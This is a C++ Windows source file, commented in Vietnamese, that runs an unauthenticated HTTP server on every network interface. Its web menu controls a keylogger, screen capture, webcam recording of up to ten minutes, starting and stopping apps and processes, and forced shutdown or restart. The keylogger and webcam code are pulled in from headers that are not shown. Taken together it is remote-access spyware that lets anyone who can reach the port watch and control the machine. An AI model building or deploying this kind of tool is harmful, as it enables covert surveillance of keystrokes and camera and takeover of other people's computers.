#include <iostream>
#include <winsock2.h>
#include <windows.h>
// Các file header hiện có của bạn
#include "config.h"
#include "http_utils.h"
#include "router.h"
#include "apps.h"
#include "processes.h"
#include "keylogger.h"

// --- 1. THÊM HEADER WEBCAM (File bạn đã tạo trước đó) ---
#include "webcam.h" 

// --- 2. HÀM HỖ TRỢ SHUTDOWN/RESTART (Bổ sung để link trong menu hoạt động) ---
void power_action(bool restart) {
    HANDLE hToken; 
    TOKEN_PRIVILEGES tkp; 
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken); 
    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid); 
    tkp.PrivilegeCount = 1; 
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0); 
    
    if (restart) 
        ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER); 
    else
        ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER); 
}

int main() {
    // 1. Khởi tạo Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed.\n";
        return 1;
    }

    // 2. Tạo socket
    SOCKET server_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (server_fd == INVALID_SOCKET) {
        std::cerr << "socket failed with error: " << WSAGetLastError() << "\n";
        WSACleanup();
        return 1;
    }

    // 3. Bind (gán địa chỉ)
    sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT); // PORT lấy từ config.h hoặc define
    server_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(server_fd, (sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        std::cerr << "Bind failed with error: " << WSAGetLastError() << "\n";
        closesocket(server_fd);
        WSACleanup();
        return 1;
    }

    // 4. Listen
    if (listen(server_fd, 5) == SOCKET_ERROR) {
        std::cerr << "Listen failed with error: " << WSAGetLastError() << "\n";
        closesocket(server_fd);
        WSACleanup();
        return 1;
    }

    std::cout << "Server running at http://localhost:" << PORT << "\n";
    
    // 5. Vòng lặp Accept và Xử lý
    while (true) {
        SOCKET client_socket = accept(server_fd, NULL, NULL);
        if (client_socket == INVALID_SOCKET) {
            std::cerr << "Accept failed with error: " << WSAGetLastError() << "\n";
            continue;
        }

        char buffer[BUFFER_SIZE]; // BUFFER_SIZE lấy từ config.h hoặc define
        int bytes_received = recv(client_socket, buffer, BUFFER_SIZE - 1, 0);

        if (bytes_received > 0) {
            buffer[bytes_received] = '\0';
            std::string request(buffer);
            std::cout << request << "\n";

            std::string route;
            // Hàm parse_request_path có thể nằm trong router.h hoặc http_utils.h
            std::map<std::string, std::string> query = parse_request_path(request, route);
            std::string response;

            if (route == "/") {
                response = html_page("<h1>WinSock C++ App Controller</h1>"
                                     "<ul>"
                                     "<li><a href='/apps'>List apps</a></li>"
                                     "<li><a href='/processes'>List processes</a></li>"
                                     "<li><a href='/processes/actions'>Start/Stop processes</a></li>"
                                     "<li><a href='/keylogger'>Keylogger</a></li>"
                                     "<li><a href='/screenshot'>Screenshot</a></li>"
                                     "<li><a href='/webcam_rec'>Record webcam</a></li>"
                                     "<li><a href='/shutdown'>Shutdown</a> (admin)</li>"
                                     "<li><a href='/restart'>Restart</a> (admin)</li>"
                                     "</ul>");
            } 
            else if (route == "/apps") {
                response = list_apps();
            } 
            else if (route == "/apps/start") {
                std::string app_name = query.count("app") ? query["app"] : "";
                start_app(app_name);
                response = redirect("/apps");
            } 
            else if (route == "/apps/stop") {
                std::string app_name = query.count("app") ? query["app"] : "";
                stop_app(app_name);
                response = redirect("/apps");
            } 
            else if (route == "/processes") {
                response = list_processes();
            } 
            else if (route == "/keylogger") {
                response = keylog_control();
            } 
            else if (route == "/keylogger/send") {
                response = keylog_receive(query);
            }
            
            // --- 3. LOGIC MỚI CHO WEBCAM & SCREENSHOT ---
            else if (route == "/screenshot") {
                // Gọi hàm từ webcam.h
                std::string file = take_screenshot();
                response = html_page("<h1>Screenshot Saved</h1><p>File: " + file + "</p>");
            } 
            else if (route == "/webcam_rec") {
                // 1. Mặc định là 10 giây
                int duration = 10; 
                
                // 2. Lấy tham số từ URL
                if (query.count("time")) {
                    try {
                        duration = std::stoi(query["time"]);
                    } catch (...) {
                        duration = 10; // Lỗi định dạng thì về mặc định
                    }
                }

                // === 3. KIỂM TRA GIỚI HẠN (AN TOÀN) ===
                if (duration < 1) {
                    duration = 1;      // Tối thiểu 1 giây
                }
                if (duration > 600) { 
                    duration = 600;    // Tối đa 600 giây (10 phút)
                }
                // ======================================

                std::cout << "DEBUG: Quay video trong " << duration << " giay.\n";

                // 4. Gọi hàm quay video
                std::string file = start_webcam_recording(duration);
                
                // 5. Phản hồi HTML
                response = html_page("<h1>Recording Started</h1>"
                                     "<p>Duration: " + std::to_string(duration) + " seconds</p>"
                                     "<p>File saved to: " + file + "</p>");
            }
            // --- LOGIC CHO SHUTDOWN/RESTART ---
            else if (route == "/shutdown") {
                power_action(false);
                response = html_page("<h1>Shutting down...</h1>");
            } 
            else if (route == "/restart") {
                power_action(true);
                response = html_page("<h1>Restarting...</h1>");
            }
            // --------------------------------------------
            
            else {
                response = html_page("<h1>404 Not Found</h1>");
            }

            send(client_socket, response.c_str(), response.length(), 0);
        }

        closesocket(client_socket);
    }

    closesocket(server_fd);
    WSACleanup();
    return 0;
}